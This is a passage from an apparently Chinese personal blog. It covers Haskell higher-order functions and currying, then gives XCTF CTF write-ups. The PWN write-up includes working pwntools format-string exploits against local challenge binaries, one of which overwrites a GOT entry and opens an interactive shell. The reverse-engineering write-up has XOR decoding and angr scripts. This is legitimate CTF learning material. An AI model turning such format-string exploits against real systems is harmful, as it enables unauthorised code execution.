<p><code>elem</code>函数，比较简单</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">elem'</span> :: (<span class="type">Eq</span> a) =&gt; a -&gt; [a] -&gt; <span class="type">Bool</span></span><br><span class="line"><span class="title">elem'</span> a [] = <span class="type">False</span></span><br><span class="line"><span class="title">elem'</span> a (x:xs)</span><br><span class="line">    | a == x    = <span class="type">True</span></span><br><span class="line">    | otherwise = a `elem'` xs</span><br></pre></td></tr></table></figure>
<p><strong>快速排序</strong></p>
<p>算法：排过序的List就是令所有小于等于头部的元素在先(它们已经排过了序)，后面是大于头部的元素(同样也排好了序)，代码很好理解</p>
<p>因为定义中有两次排序，所以得递归两次</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">quicksort</span> :: (<span class="type">Ord</span> a) =&gt; [a] -&gt; [a]</span><br><span class="line"><span class="title">quicksort</span> [] = []</span><br><span class="line"><span class="title">quicksort</span> (x:xs) = </span><br><span class="line">    <span class="keyword">let</span> smallerSorted = quicksort [a | a &lt;- xs, a &lt;= x]</span><br><span class="line">        biggerSorted = quicksort [a | a &lt;- xs, a &gt; x]</span><br><span class="line">    <span class="keyword">in</span> smallerSorted ++ [x] ++ biggerSorted</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>注意，算法定义的动词是   “是”什么 ，而不是   “做”什么，再”做”什么…</strong></p>
<p>这就是<strong>函数式编程之美</strong></p>
</blockquote>
<h1 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h1><h2 id="Curried-functions"><a href="#Curried-functions" class="headerlink" title="Curried functions"></a>Curried functions</h2><p>本质上，haskell的所有函数都只有<strong>一个参数</strong></p>
<p>所有<strong>多个参数</strong>的函数都是<code>Curried functions</code></p>
<blockquote>
<p>执行 <code>max 4 5</code> 时，它首先返回一个取一个参数的函数，其返回值不是 4 就是该参数，取决于谁大</p>
<p>然后，以 5 为参数调用它，并取得最终结果</p>
</blockquote>
<p>以下两个函数调用时等价的：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; max <span class="number">4</span> <span class="number">5</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">*<span class="type">Main</span>&gt; (max <span class="number">4</span>) <span class="number">5</span></span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>把空格放到两个东西之间，叫做<strong>函数调用</strong>，有点像运算符，并且拥有最高的优先顺序</p>
</blockquote>
<p>考虑 <code>max</code> 函数的型别： <code>max :: (Ord a) =&gt; a -&gt; a -&gt; a</code></p>
<p>它也可以写作： <code>max :: (Ord a) =&gt; a -&gt; (a -&gt; a)</code></p>
<p>可以读作 <code>max</code> 取一个参数 <code>a</code>，并返回一个函数(就是那个 <code>-&gt;</code>)，这个函数取一个 <code>a</code> 型别的参数，返回一个a</p>
<p>这就是之前提到的，为何只用箭头来分隔参数和返回值型别</p>
<blockquote>
<p>这样的优势在于，若以不全的参数来调用某函数，就可以得到一个<strong>不全调用的函数</strong></p>
<p>以便构造新的函数</p>
</blockquote>
<p>(不全调用的函数)简单例子</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">multThree</span> :: (<span class="type">Num</span> a) =&gt; a -&gt; a -&gt; a -&gt; a</span><br><span class="line"><span class="title">multThree</span> x y z = x * y * z</span><br></pre></td></tr></table></figure>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; <span class="keyword">let</span> multTwoWithNine = multThree <span class="number">9</span></span><br><span class="line">*<span class="type">Main</span>&gt; multTwoWithNine <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">54</span></span><br><span class="line">*<span class="type">Main</span>&gt; <span class="keyword">let</span> multWithEighteen = multTwoWithNine <span class="number">2</span></span><br><span class="line">*<span class="type">Main</span>&gt; multWithEighteen <span class="number">12</span></span><br><span class="line"><span class="number">216</span></span><br></pre></td></tr></table></figure>
<p>构造<strong>新的函数</strong>：考虑一个与100比较大小的函数</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">compareWithHundred</span> :: (<span class="type">Num</span> a, <span class="type">Ord</span> a) =&gt; a -&gt; <span class="type">Ordering</span></span><br><span class="line"><span class="title">compareWithHundred</span> x = compare <span class="number">100</span> x</span><br></pre></td></tr></table></figure>
<p>这时注意到<code>=</code>两边都有<code>x</code>，而<code>compare 100</code>会返回一个与100比较的函数，这正是我们想要的</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">compareWithHundred</span> :: (<span class="type">Num</span> a, <span class="type">Ord</span> a) =&gt; a -&gt; <span class="type">Ordering</span></span><br><span class="line"><span class="title">compareWithHundred</span> = compare <span class="number">100</span></span><br></pre></td></tr></table></figure>
<h3 id="中缀函数的柯里化"><a href="#中缀函数的柯里化" class="headerlink" title="中缀函数的柯里化"></a>中缀函数的柯里化</h3><p>中缀函数也可以不全调用，用括号把它和一边的参数括在一起就可以了</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">divideByTen</span> :: (<span class="type">Floating</span> a) =&gt; a -&gt; a</span><br><span class="line"><span class="title">divideByTen</span> = (/<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; divideByTen <span class="number">100</span></span><br><span class="line"><span class="number">10.0</span></span><br></pre></td></tr></table></figure>
<p>其中调用<code>divideByTen 200</code>就是<code>(/10) 200</code>，它和<code>200/10</code>等价</p>
<p>再考虑一个检查字元是否为大写字母的函数</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">isUpperAlphanum</span> :: <span class="type">Char</span> -&gt; <span class="type">Bool</span></span><br><span class="line"><span class="title">isUpperAlphanum</span> = (`elem` ['<span class="type">A'</span>..'<span class="type">Z'</span>])</span><br></pre></td></tr></table></figure>
<p>唯一的<strong>例外</strong>是<code>-</code>运算符，按照定义，<code>(-4)</code>理应返回一个将参数减4的函数，实际上为了计算方便它表示负4</p>
<p>如果一定要弄个将参数减4的函数，可以像这样</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">subtractFour</span> :: (<span class="type">Num</span> a) =&gt; a -&gt; a</span><br><span class="line"><span class="title">subtractFour</span> = subtract <span class="number">4</span></span><br></pre></td></tr></table></figure>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; subtractFour <span class="number">10</span></span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>
<h2 id="高阶函数实例"><a href="#高阶函数实例" class="headerlink" title="高阶函数实例"></a>高阶函数实例</h2><h3 id="applyTwice"><a href="#applyTwice" class="headerlink" title="applyTwice"></a>applyTwice</h3><p>haskell中的函数可以取另一个函数做参数，也可以返回函数</p>
<p>举个例子，我们写一个：取一个函数，并调用它两次的函数</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">applyTwice</span> :: (a -&gt; a) -&gt; a -&gt; a</span><br><span class="line"><span class="title">applyTwice</span> f x = f (f x)</span><br></pre></td></tr></table></figure>
<p>注意<strong>型别声明</strong>，之前很少用到括号，因为<code>(-&gt;)</code>是自然的左结合，但是这里括号是必须的</p>
<p>它标明了首个参数是<strong>参数和返回值都是a的函数</strong>，第二个参数和返回值也都是a</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; applyTwice (+<span class="number">3</span>) <span class="number">10</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line">*<span class="type">Main</span>&gt; (+<span class="number">3</span>) `applyTwice`  <span class="number">10</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line">*<span class="type">Main</span>&gt; app</span><br><span class="line"><span class="title">appendFile</span>  applyTwice</span><br><span class="line">*<span class="type">Main</span>&gt; applyTwice (++ <span class="string">"world"</span>) <span class="string">"hello"</span></span><br><span class="line"><span class="string">"helloworldworld"</span></span><br><span class="line">*<span class="type">Main</span>&gt; applyTwice (<span class="number">3</span>:) [<span class="number">1</span>]</span><br><span class="line">[<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果函数需要传入一个一元参数，我们可以用<strong>不全调用</strong>让它剩一个参数，再把它交出去</p>
</blockquote>
<h3 id="zipWith"><a href="#zipWith" class="headerlink" title="zipWith"></a>zipWith</h3><p>用高阶函数的思想实现标准库中的函数<code>zipWith</code>，它取一个函数和两个List做参数，用相应的元素调用该函数</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">zipWith'</span> :: (a -&gt; b -&gt; c) -&gt; [a] -&gt; [b] -&gt; [c]  </span><br><span class="line"><span class="title">zipWith'</span> _ [] _ = []  </span><br><span class="line"><span class="title">zipWith'</span> _ _ [] = []  </span><br><span class="line"><span class="title">zipWith'</span> f (x:xs) (y:ys) = f x y : zipWith' f xs ys</span><br></pre></td></tr></table></figure>
<p>注意这个函数的型别声明：</p>
<p>第一个参数是一个函数，它取两个参数返回一个值，它们的型别不必相同</p>
<p>第二、三个参数都是列表</p>
<p>最后返回值是一个列表</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">ghci</span>&gt; zipWith' (+) [<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>] [<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>]  </span><br><span class="line">[<span class="number">6</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">9</span>]  </span><br><span class="line"><span class="title">ghci</span>&gt; zipWith' max [<span class="number">6</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>] [<span class="number">7</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>]  </span><br><span class="line">[<span class="number">7</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>]  </span><br><span class="line"><span class="title">ghci</span>&gt; zipWith' (++) [<span class="string">"foo "</span>，<span class="string">"bar "</span>，<span class="string">"baz "</span>] [<span class="string">"fighters"</span>，<span class="string">"hoppers"</span>，<span class="string">"aldrin"</span>]  </span><br><span class="line">[<span class="string">"foo fighters"</span>,<span class="string">"bar hoppers"</span>,<span class="string">"baz aldrin"</span>]  </span><br><span class="line"><span class="title">ghci</span>&gt; zipWith' (*) (replicate <span class="number">5</span> <span class="number">2</span>) [<span class="number">1.</span>.]  </span><br><span class="line">[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>命令式语言使用 <code>for</code>、<code>while</code>、赋值、状态检测来实现功能，再包起来留个界面，使之像函数一样调用函数式语言使用高阶函数来抽象出常见的模式，如成对遍历并处理两个 List 或从中筛除不需要的结果</p>
</blockquote>
<h3 id="flip"><a href="#flip" class="headerlink" title="flip"></a>flip</h3><p>再考虑实现<code>flip</code>函数，它简单地取一个函数作参数并返回一个相似的函数，差别在于它们的两个参数交换顺序</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">ghci</span>&gt; flip' zip [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>] <span class="string">"hello"</span>  </span><br><span class="line">[('h',<span class="number">1</span>),('e',<span class="number">2</span>),('l',<span class="number">3</span>),('l',<span class="number">4</span>),('o',<span class="number">5</span>)]  </span><br><span class="line"><span class="title">ghci</span>&gt; zipWith (flip' div) [<span class="number">2</span>,<span class="number">2.</span>.] [<span class="number">10</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>]  </span><br><span class="line">[<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>我猜测，正是由于<strong>惰性</strong>和<strong>柯里化</strong>的缘故，haskell中的f(g(x))，会先计算函数复合的结果，再用实际参数调用它</p>
</blockquote>
<h3 id="map-amp-filter"><a href="#map-amp-filter" class="headerlink" title="map&amp;filter"></a>map&amp;filter</h3>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/25/XCTF攻防世界-PWNwp/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="purecall">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="vct的演算纸">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/25/XCTF攻防世界-PWNwp/" itemprop="url">XCTF攻防世界-PWNwp</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-25T15:44:53+08:00">
                2019-01-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2019/01/25/XCTF攻防世界-PWNwp/" class="leancloud_visitors" data-flag-title="XCTF攻防世界-PWNwp">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>有一段时间没做pwn了，试试手</p>
<h1 id="新手练习"><a href="#新手练习" class="headerlink" title="新手练习"></a>新手练习</h1><h1 id="get-shell"><a href="#get-shell" class="headerlink" title="get-shell"></a>get-shell</h1><p>nc过去就可以了</p>
<h2 id="cgfsb"><a href="#cgfsb" class="headerlink" title="cgfsb"></a>cgfsb</h2><p>32位栈上printf，<del>一开始忘了searchmem了，都没发现字符串在栈上</del></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./cgfsb"</span>)</span><br><span class="line">pwnme = <span class="number">0x0804A068</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"1111"</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;pwnme:<span class="number">8</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="萌新入坑"><a href="#萌新入坑" class="headerlink" title="萌新入坑"></a>萌新入坑</h1><h2 id="mary-morton"><a href="#mary-morton" class="headerlink" title="mary_morton"></a>mary_morton</h2><p>printf的题，题目给的附件还有问题，没什么兴趣…放个别人的exp吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> formatStringExploiter.FormatString <span class="keyword">import</span> FormatString</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./mary_morton"</span>)</span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p = process(elf.file.name)</span><br><span class="line">    p.recvuntil(<span class="string">"Exit the battle \n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(s)</span>:</span></span><br><span class="line">    print(<span class="string">"Sending: "</span> + repr(s))</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(s)</span><br><span class="line">    ret = p.recvuntil(<span class="string">"1. Stack Bufferoverflow Bug"</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Exit the battle \n"</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">winner = <span class="number">0x4008DA</span></span><br><span class="line">connect()</span><br><span class="line"></span><br><span class="line">fmtStr = FormatString(exec_fmt,elf=elf,index=<span class="number">6</span>,pad=<span class="number">0</span>,explore_stack=<span class="keyword">False</span>)</span><br><span class="line">fmtStr.write_q(elf.symbols[<span class="string">'got.printf'</span>], winner)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/20/XCTF攻防世界-逆向wp/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="purecall">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="vct的演算纸">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/20/XCTF攻防世界-逆向wp/" itemprop="url">XCTF攻防世界-逆向wp</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-20T22:46:47+08:00">
                2019-01-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2019/01/20/XCTF攻防世界-逆向wp/" class="leancloud_visitors" data-flag-title="XCTF攻防世界-逆向wp">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>to be a hardcore reverser</p>
<h1 id="新手练习"><a href="#新手练习" class="headerlink" title="新手练习"></a>新手练习</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>最简单的exe题…wp说直接strings就好，不过一开始字符串被打散了，不好直接看出来</p>
<p>试着直接符号执行，惊讶的是exe在ubuntu的angr里直接跑起来了，不过占资源太多被杀掉好几次，设置了系统参数也没办法解决，就放弃了</p>
<p>后来尝试了下IDA的动态调试，在cmp处下断点就解决了</p>
<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>一个游戏通关后输出flag的题</p>
<p>先在IDA中<code>shift+F12</code>查找字符串，发现<code>the flag is</code>，跟踪到输出处</p>
<p><del>认定前面没有陷阱之后</del>，发现就是2个字符数组的异或…</p>
<blockquote>
<p>还是得多刷题，一开始并没有想到查找字符串哎</p>
</blockquote>
<h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello,CTF"></a>Hello,CTF</h2><p>一串硬编码的十六进制数据，转成字符串就可以了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*s = <span class="string">"437261636b4d654a757374466f7246756e"</span>;</span><br><span class="line"><span class="keyword">int</span> num[] =&#123;</span><br><span class="line">    <span class="number">0x43</span>,<span class="number">0x72</span>,<span class="number">0x61</span>,<span class="number">0x63</span>,<span class="number">0x6b</span>,<span class="number">0x4d</span>,<span class="number">0x65</span>,<span class="number">0x4a</span>,<span class="number">0x75</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x46</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x46</span>,<span class="number">0x75</span>,<span class="number">0x6e</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"0x%c%c,"</span>, s[i], s[i + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//0x43,0x72,0x61,0x63,0x6b,0x4d,0x65,0x4a,0x75,0x73,0x74,0x46,0x6f,0x72,0x46,0x75,0x6e</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>, num[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//CrackMeJustForFun</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>我就是要用C解…</p>
</blockquote>
<h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>给了源码，值得注意的是命令行参数的问题</p>
<p>比如输入<code>./hash 1 2 3</code>，这样<code>argc==4</code></p>
<p><code>argv[0]==&quot;./hash&quot;,argv[1]==&quot;1&quot;,argv[2]==&quot;2&quot;,argv[3]==&quot;3&quot;</code></p>
<p>不过我试了试直接符号执行，发现终于成功了一次…记录于<a href="https://purecall.github.io/2019/01/13/符号执行-angr/" target="_blank" rel="noopener">符号执行-angr</a></p>
<h2 id="simple2"><a href="#simple2" class="headerlink" title="simple2"></a>simple2</h2><p>从52pojie找了2个查壳工具，发现是upx壳，直接<code>upx -d</code>脱壳即可，flag是硬编码明文比较</p>
<h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><blockquote>
<p>题目名字的意思好像是一个远程接入软件</p>
</blockquote>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/1.png" alt="1"></p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/2.png" alt="2"></p>
<p>简单的异或题，不过一开始跑出来是乱码，后来看了网上的wp才发现…</p>
<p><strong>IDA里字符串常量已经加上了转义符号，也就是说那串字符串里没有反斜杠</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>**argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> num = <span class="number">0x65626D61726168</span>LL;</span><br><span class="line">	<span class="keyword">char</span>* str = <span class="string">":\"AL_RT^L*.?+6/46"</span>;   <span class="comment">// len == 17</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">17</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>,*((<span class="keyword">char</span>*)&amp;num+i%<span class="number">7</span>)^str[i]); </span><br><span class="line">        <span class="comment">//*(&amp;num + i%7)  -&gt;  num[i%7]</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本题也符合angr的适用范围</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">"./logmein"</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x4007ac</span>)</span><br><span class="line"><span class="keyword">print</span> simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
